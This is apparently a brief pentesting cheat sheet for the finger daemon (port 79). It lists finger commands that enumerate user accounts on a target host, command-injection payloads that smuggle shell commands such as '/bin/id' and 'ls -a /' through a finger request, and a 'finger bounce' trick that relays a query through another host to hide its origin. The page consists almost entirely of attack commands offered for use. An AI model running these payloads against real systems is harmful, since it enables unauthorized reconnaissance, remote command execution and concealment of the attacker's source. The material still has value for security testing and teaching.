# User enumeration
```
finger 'a b c d e f g h' @example.com
finger admin@example.com
finger user@example.com
finger 0@example.com
finger .@example.com
finger **@example.com
finger test@example.com
finger @example.com
```
# Command execution
```
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

# Finger Bounce

Hop from one finger deamon to another. Request will get logged as if it arrived from a relay.

```
finger@host.com@victim.com
```

# References
> - Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html
> - http://0daysecurity.com/penetration-testing/enumeration.html
